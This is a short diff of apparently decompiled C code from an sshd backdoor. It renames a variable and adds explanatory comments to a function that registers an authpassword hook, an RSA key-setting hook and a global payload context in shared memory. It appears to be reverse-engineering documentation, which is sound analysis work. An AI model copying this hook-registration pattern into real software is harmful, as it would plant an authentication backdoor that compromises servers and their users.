@@ -15,15 +15,18 @@
 int init_shared_globals(backdoor_shared_globals_t *shared_globals)
 
 {
-  int status;
+  int init_status;
   
-  status = 5;
+  init_status = 5;
   if (shared_globals != (backdoor_shared_globals_t *)0x0) {
+    // AutoDoc: Publish the authpassword monitor hook so every process sees the same entry point.
     shared_globals->authpassword_hook_entry = mm_answer_authpassword_hook;
+    // AutoDoc: Point the shared block at the RSA/EVP shim so later callers inherit the resolved trampoline.
     shared_globals->evp_set1_rsa_hook_entry = hook_EVP_PKEY_set1_RSA;
+    // AutoDoc: Expose the singleton `global_ctx` pointer that carries payload buffers, sshd metadata, and imports.
     shared_globals->global_ctx_slot = (global_context_t **)&global_ctx;
-    status = 0;
+    init_status = 0;
   }
-  return status;
+  return init_status;
 }
 
